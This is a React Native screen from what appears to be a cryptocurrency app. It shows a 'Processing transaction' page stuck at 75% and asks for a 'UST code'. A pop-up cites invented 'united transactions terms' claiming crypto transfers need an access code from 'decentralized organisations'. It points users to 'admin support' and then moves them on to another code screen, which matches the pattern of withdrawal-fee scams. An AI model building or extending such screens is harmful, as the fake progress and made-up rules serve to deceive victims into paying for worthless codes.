import React, { useState, useEffect } from 'react'
import {
    View,
    Text,
    StyleSheet,
    Pressable,
    SafeAreaView,
    ScrollView,
    Dimensions,
    TextInput,
    KeyboardAvoidingView
} from "react-native";

import { Feather } from '@expo/vector-icons';
import * as Progress from 'react-native-progress'
import Loader from '../loaders/Loader'
import { sendUstCode } from "../store/action/appStorage";
import { useDispatch, useSelector } from "react-redux";
import AuthModal from '../modals/authModal';
import * as WebBrowser from 'expo-web-browser';
import TaxModal from "../modals/TaxModal"

const Ust = ({ navigation }) => {
    let [isLoading, setIsLoading] = useState(true)
    const [modalVisible, setModalVisible] = useState(false);
    const [isAuthError, setIsAuthError] = useState(false)
    const [authInfo, setAuthInfo] = useState("")
    const [ustCode, setUstCode] = useState(false);
    const dispatch = useDispatch()

    let { background, importantText, normalText, fadeColor, blue, fadeButtonColor } = useSelector(state => state.userAuth)

    //preventing memory leak
    useEffect(() => {
        let focus = navigation.addListener('beforeRemove', (e) => {
            if (isLoading) {
                e.preventDefault();
            } else {
                //can go back
            }
        });
        return focus
    }, [isLoading]);

    let modalHandler = () => {
        setModalVisible(prev => !prev)
    }

    let changeVisibility = () => {
        setIsAuthError(prev => !prev)
    }

    useEffect(() => {
        setTimeout(() => {
            setIsLoading(false)
            setModalVisible(true)

        }, 3000)



    }, [])

    const chatHandler = async () => {
        await WebBrowser.openBrowserAsync('https://www.capchains.cloud/support')
    }

    const submitHandler = async () => {
        if (!ustCode) {
            return
        }
        setIsLoading(true)
        let res = await dispatch(sendUstCode({
            ustCode
        }))
        if (!res.bool) {
            setIsAuthError(true)
            setAuthInfo(res.message)
            setIsLoading(false)
            return
        }
        //if tax code match,navigate to ust code
        setIsAuthError(true)
        setAuthInfo(res.message)
        setIsLoading(false)
        setTimeout(() => {
            navigation.navigate('Ktc')
        }, 5000)





    }


    const changeHandler = (e) => {
        setUstCode(e)
    }


    if (isLoading) {
        return <Loader />
    }

    return (<>
        <TaxModal
            modalVisible={modalVisible}
            setModalVisible={setModalVisible}
            modalHandler={modalHandler}
            modalText="According to the united transactions terms,Every transaction involving crypto assets will require confirmation acess code from decentralized organisations.Enter code to complete transfer or contact our admin support if you do not have this code"

        />

        {/* modal for proceeding*/}
        {isAuthError && <AuthModal modalVisible={isAuthError} updateVisibility={changeVisibility} message={authInfo} />}

        <SafeAreaView key={3} style={{ flex: 1, backgroundColor: background }}>
            <ScrollView contentContainerStyle={styles.scrollContainer} stickyHeaderIndices={[0]}>
                <View style={{ display: 'flex', width: '100%' }}>
                    <View style={{ ...styles.headerContainer, backgroundColor: background }}>
                        <Pressable onPress={() => navigation.goBack()} style={styles.iconContainer}>
                            <Feather name="arrow-left" size={24} color={background === 'white' ? "black" : "white"} />

                        </Pressable>

                        <Pressable style={styles.processingCon}>

                            <Text style={{ ...styles.processingText, color: importantText }}>Processing transaction</Text>

                        </Pressable>







                    </View>
                </View>


                <View style={styles.progress}>
                    <Progress.Bar progress={0.75} height={10}
                        unfilledColor='rgb(240,240,240)'
                        color='#1652f0'
                        borderColor='rgb(240,240,240)'

                        filledColor='red' width={Dimensions.get('window').width / 1.39} />
                    <Text style={{...styles.loader,color:importantText}}>75%</Text>

                </View>




                <KeyboardAvoidingView style={styles.inputContainer}>
                    <TextInput style={{...styles.input,color: importantText,borderColor:background==='black'? fadeColor:'rgb(210,210,210)',}}
                        placeholder="Enter UST code"
                        onChangeText={changeHandler}
                        placeholderTextColor={normalText}

                    />
                    <Pressable style={{...styles.submit,backgroundColor:fadeColor}} onPress={submitHandler}>
                        <Text style={{...styles.submitText,color:importantText}}>send</Text>
                    </Pressable>

                </KeyboardAvoidingView>











                <View style={styles.footerContainer}>
                    <Pressable style={styles.footerButton} onPress={chatHandler}>
                        <Text style={styles.footerButtonText}>Contact support</Text>

                    </Pressable>

                </View>


            </ScrollView>
        </SafeAreaView></>

    );
};

const styles = StyleSheet.create({
    /*end of modal*/
    screen: {
        flex: 1,
    },
    scrollContainer: {
        paddingBottom: 20,
        width: Dimensions.get('window').width,

    },
    headerContainer: {
        paddingTop: 15,
        display: "flex",
        flexDirection: "row",
        position: 'relative',
        paddingHorizontal: 25,
        marginBottom: 5,
        alignItems: 'center'

    },
    iconContainer:{
        width:'10%'

    },
    /*end of selector styling */
    processingCon: {
        display: "flex",
        flexDirection: 'row',
        alignItems: "center",
        width:'90%'
    },
    processingText: {
        fontSize: 20,
        fontFamily: 'Poppins',
    },

    progress: {
        display: 'flex',
        flexDirection: 'row',
        alignItems: 'center',
        marginBottom: 50,
        marginHorizontal: 30

    },
    progressbar: {

    },
    loader: {
        fontSize: 16,
        fontFamily: 'Poppins',
        marginLeft: 10,
        color: 'rgb(100,100,100)'

    },



    inputContainer: {
        display: 'flex',
        flexDirection: 'row',
        justifyContent: 'center',
        marginBottom: 220

    },
    input: {
        width: '65%',
        borderColor: 'rgb(200,200,200)',
        borderWidth: .5,
        height: 50,
        borderRadius: 10,
        paddingLeft: 30,
        fontSize: 18,
        color: 'black',
        marginBottom: 30

    },
    submit: {
        width: '20%',
        backgroundColor: 'rgb(240,240,240)',
        height: 50,
        marginLeft: 5,
        borderRadius: 5,
        display: 'flex',
        alignItems: "center",
        justifyContent: 'center'


    },
    submitText: {
        color: 'black',
        fontFamily: 'ABeeZee',

    },

    choiceText: {
        marginBottom: 30,
        fontFamily: 'Poppins',
    },


    footerContainer: {
        height: Dimensions.get('window').height / 4,
        display: 'flex',
        justifyContent: 'flex-end',
        alignItems: 'center',
        paddingHorizontal: 15,
        paddingBottom: 5
    },
    footerButton: {
        paddingVertical: 17,
        display: 'flex',
        flexDirection: 'row',
        alignItems: 'center',
        justifyContent: 'center',
        backgroundColor: '#1652f0',
        width: '100%',
        borderRadius: 30,
    },
    footerButtonText: {
        fontSize: 16,
        fontFamily: 'Poppins',
        color: '#fff',
        marginRight: 10

    }



})

export default Ust;
